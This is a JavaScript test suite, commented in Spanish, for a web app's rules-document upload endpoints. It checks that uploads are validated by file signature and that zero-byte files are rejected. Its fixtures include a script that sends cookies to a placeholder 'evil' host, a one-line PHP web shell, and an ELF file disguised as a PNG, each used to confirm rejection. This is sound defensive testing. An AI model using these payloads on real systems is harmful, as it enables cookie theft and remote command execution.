const fs = require('fs');
const os = require('os');
const path = require('path');
const request = require('supertest');
const app = require('../../src/app');
const { query: dbQuery } = require('../../src/config/database.js');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const { contrasenaDePrueba } = require('../helpers/credentials');
const { accessTokenDe } = require('../helpers/cookies');
const { validarArchivoSubido, FIRMAS } = require('../../src/utils/archivos');
const { REGLAMENTOS_DIR, ALLOWED_EXTENSIONS } = require('../../src/config/upload');

const sufijo = crypto.randomBytes(4).toString('hex');
const EMAIL = `test_upload_${sufijo}@jebo.test`;
const PASS = contrasenaDePrueba();
const DISCIPLINA = `disciplina_upload_${sufijo}`;
const DOCUMENTO = `97${sufijo}`;

const FIRMA_PDF = Buffer.from('%PDF-1.4\n1 0 obj\n', 'ascii');
const FIRMA_PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const ZIP_LOCAL_HEADER = Buffer.from([0x50, 0x4b, 0x03, 0x04]);
const OLE2 = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);

let token;
let idDisciplina;
let idUsuario;
let dirTemporal;

/**
 * Los archivos que YA estaban en `uploads/reglamentos/` cuando arrancó la suite.
 *
 * El endpoint de subida escribe en el directorio real (`config/upload.js` monta
 * multer con `destination: REGLAMENTOS_DIR`), y este suite sube cuatro archivos
 * válidos que la app guarda de verdad. El `afterAll` limpia la base y el
 * directorio temporal de los fixtures, pero no los archivos que quedaron en el
 * directorio de la aplicación: cada corrida dejaba cuatro (pdf, png, docx, doc)
 * y el repo se llenaba de basura de test — 536 archivos, 112 de los cuales
 * llegaron a versionarse en algún commit.
 *
 * El borrado es por diferencia contra este snapshot, y no un `rm -rf` del
 * directorio: acá pueden estar los reglamentos de verdad de las discretas, y un
 * test que los borra es peor que el bug que corrige.
 */
let presentesAlArrancar;

const listarReglamentos = () =>
  fs.existsSync(REGLAMENTOS_DIR) ? fs.readdirSync(REGLAMENTOS_DIR) : [];

const escribir = (nombre, contenido) => {
  const ruta = path.join(dirTemporal, nombre);
  fs.writeFileSync(ruta, contenido);
  return ruta;
};

const subir = (ruta, nombre, mimetype) =>
  request(app)
    .post(`/disciplines/${idDisciplina}/reglamento`)
    .set('Authorization', `Bearer ${token}`)
    .attach('reglamento', ruta, { filename: nombre, contentType: mimetype });

/** Cuántos archivos hay en el directorio de reglamentos. */
const enReglamentos = () => listarReglamentos().length;

const reglamentoDe = async () => {
  const r = await dbQuery('SELECT reglamento FROM disciplina WHERE id_disciplina = $1', [idDisciplina]);
  return r.rows[0].reglamento;
};

beforeAll(async () => {
  dirTemporal = fs.mkdtempSync(path.join(os.tmpdir(), 'jebo-upload-'));
  presentesAlArrancar = new Set(listarReglamentos());

  const rol = await dbQuery("SELECT id_rol FROM rol WHERE descripcion = 'Administrador'");
  const hash = await bcrypt.hash(PASS, 4);
  const ins = await dbQuery(
    `INSERT INTO usuario (nombre, email, password_hash, id_rol, estado, documento)
     VALUES ($1, $2, $3, $4, 'Activo', $5) RETURNING id_usuario`,
    ['Upload Test', EMAIL, hash, rol.rows[0].id_rol, DOCUMENTO]
  );
  idUsuario = ins.rows[0].id_usuario;

  const login = await request(app).post('/auth/login').send({ email: EMAIL, password: PASS });
  expect(login.status).toBe(200);
  token = accessTokenDe(login);

  const d = await dbQuery(
    `INSERT INTO disciplina (nombre, reglamento, jugadores_por_equipo, descripcion)
     VALUES ($1, '', 11, $2) RETURNING id_disciplina`,
    [DISCIPLINA, 'Disciplina de la suite de upload']
  );
  idDisciplina = d.rows[0].id_disciplina;
});

afterAll(async () => {
  await dbQuery('DELETE FROM disciplina WHERE nombre = $1', [DISCIPLINA]);
  await dbQuery('DELETE FROM bitacora WHERE id_usuario = $1', [idUsuario]);
  await dbQuery('DELETE FROM refresh_token_revocado WHERE id_usuario = $1', [idUsuario]);
  await dbQuery('DELETE FROM usuario WHERE id_usuario = $1', [idUsuario]);
  await dbQuery('DELETE FROM login_intentos WHERE identificador = $1', [EMAIL]);
  fs.rmSync(dirTemporal, { recursive: true, force: true });

  // Los archivos que esta corrida dejó en el directorio de la aplicación. Por
  // diferencia contra el snapshot, no por patrón ni a ciegas: lo que ya estaba
  // (los reglamentos reales de las discretas) no se toca.
  const nuevos = listarReglamentos().filter((nombre) => !presentesAlArrancar.has(nombre));
  for (const nombre of nuevos) {
    fs.rmSync(path.join(REGLAMENTOS_DIR, nombre), { force: true });
  }
});

describe('X-13: la extension y el MIME los declara el cliente, los bytes no', () => {
  it('rechaza un .pdf cuyo contenido es HTML con script', async () => {
    const antes = enReglamentos();
    const ruta = escribir('falso.pdf', '<html><script>fetch("//evil/"+document.cookie)</script></html>');

    const res = await subir(ruta, 'reglamento.pdf', 'application/pdf');

    expect(res.status).toBe(400);
    expect(enReglamentos()).toBe(antes);
  });

  it('rechaza un .jpg que en realidad es PHP', async () => {
    const antes = enReglamentos();
    const ruta = escribir('falso.jpg', '<?php system($_GET["c"]); ?>');

    const res = await subir(ruta, 'foto.jpg', 'image/jpeg');

    expect(res.status).toBe(400);
    expect(enReglamentos()).toBe(antes);
  });

  it('rechaza un .png que es un ejecutable ELF', async () => {
    const ruta = escribir('falso.png', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]));

    const res = await subir(ruta, 'imagen.png', 'image/png');

    expect(res.status).toBe(400);
  });

  it('acepta un PDF real', async () => {
    const antes = enReglamentos();
    const ruta = escribir('real.pdf', Buffer.concat([FIRMA_PDF, Buffer.from('%%EOF\n', 'ascii')]));

    const res = await subir(ruta, 'reglamento.pdf', 'application/pdf');

    expect(res.status).toBe(200);
    expect(res.body.data.reglamento).toMatch(/^\/uploads\/reglamentos\//);
    expect(enReglamentos()).toBe(antes + 1);
  });

  it('acepta un PNG real', async () => {
    const ruta = escribir('real.png', Buffer.concat([FIRMA_PNG, Buffer.alloc(64)]));

    const res = await subir(ruta, 'imagen.png', 'image/png');

    expect(res.status).toBe(200);
  });

  it('acepta un .docx real (contenedor ZIP)', async () => {
    const ruta = escribir('real.docx', Buffer.concat([ZIP_LOCAL_HEADER, Buffer.alloc(200)]));

    const res = await subir(
      ruta,
      'reglamento.docx',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    );

    expect(res.status).toBe(200);
  });

  it('acepta un .doc real (OLE2)', async () => {
    const ruta = escribir('real.doc', Buffer.concat([OLE2, Buffer.alloc(200)]));

    const res = await subir(ruta, 'reglamento.doc', 'application/msword');

    expect(res.status).toBe(200);
  });

  it('tambien cubre el endpoint de torneo, no solo el de disciplina', async () => {
    const ruta = escribir('falso2.pdf', '<html><script>alert(1)</script></html>');
    const inst = await dbQuery(
      'INSERT INTO instancia (descripcion_instancia) VALUES ($1) RETURNING id_instancia',
      [`instancia_upload_${sufijo}`]
    );
    const idTorneo = await dbQuery(
      `INSERT INTO torneo (nombre, categoria, fecha_inicio, fecha_fin, estado, id_disciplina, id_instancia)
       SELECT $1, 'Unica', current_date, current_date + 1, 'Programado', id_disciplina, $3
         FROM disciplina WHERE id_disciplina = $2 RETURNING id_torneo`,
      [`torneo_upload_${sufijo}`, idDisciplina, inst.rows[0].id_instancia]
    );

    try {
      const res = await request(app)
        .post(`/tournaments/${idTorneo.rows[0].id_torneo}/reglamento`)
        .set('Authorization', `Bearer ${token}`)
        .attach('reglamento', ruta, { filename: 'r.pdf', contentType: 'application/pdf' });

      expect(res.status).toBe(400);
    } finally {
      await dbQuery('DELETE FROM torneo WHERE nombre = $1', [`torneo_upload_${sufijo}`]);
      await dbQuery('DELETE FROM instancia WHERE descripcion_instancia = $1', [`instancia_upload_${sufijo}`]);
    }
  });

  it('el rechazo no dice cual era la firma esperada', async () => {
    const ruta = escribir('falso.pdf', 'nada que ver con un pdf');

    const res = await subir(ruta, 'reglamento.pdf', 'application/pdf');

    expect(res.status).toBe(400);
    expect(res.body.error).not.toMatch(/0x[0-9a-f]/i);
    expect(res.body.error).not.toMatch(/\b(25|50|44|46|ff|d8|89)\b/i);
  });
});

describe('X-17: un archivo de 0 bytes', () => {
  it('se rechaza en vez de devolverse 200', async () => {
    const antes = enReglamentos();
    const ruta = escribir('vacio.pdf', Buffer.alloc(0));

    const res = await subir(ruta, 'reglamento.pdf', 'application/pdf');

    expect(res.status).toBe(400);
    expect(enReglamentos()).toBe(antes);
  });

  it('no deja la disciplina apuntando a un archivo que no existe', async () => {
    const antes = await reglamentoDe();

    const ruta = escribir('vacio2.pdf', Buffer.alloc(0));
    const res = await subir(ruta, 'reglamento.pdf', 'application/pdf');
    expect(res.status).toBe(400);

    expect(await reglamentoDe()).toBe(antes);
  });
});

describe('validarArchivoSubido', () => {
  it('falla cerrado ante una extension sin firma conocida', async () => {
    const ruta = escribir('raro.xyz', 'contenido cualquiera');

    const r = await validarArchivoSubido({ path: ruta, originalname: 'raro.xyz' });

    expect(r.ok).toBe(false);
  });

  it('devuelve ok:false cuando no puede leer el archivo', async () => {
    const r = await validarArchivoSubido({
      path: path.join(dirTemporal, 'no-existe.pdf'),
      originalname: 'no-existe.pdf'
    });

    expect(r.ok).toBe(false);
    expect(r.motivo).toMatch(/no existe/i);
  });

  it('la tabla de firmas cubre exactamente las extensiones que admite multer', () => {
    const permitidas = ALLOWED_EXTENSIONS.map((e) => e.toLowerCase()).sort();
    const conFirma = Object.keys(FIRMAS).map((e) => e.toLowerCase()).sort();

    expect(conFirma).toEqual(permitidas);
  });
});
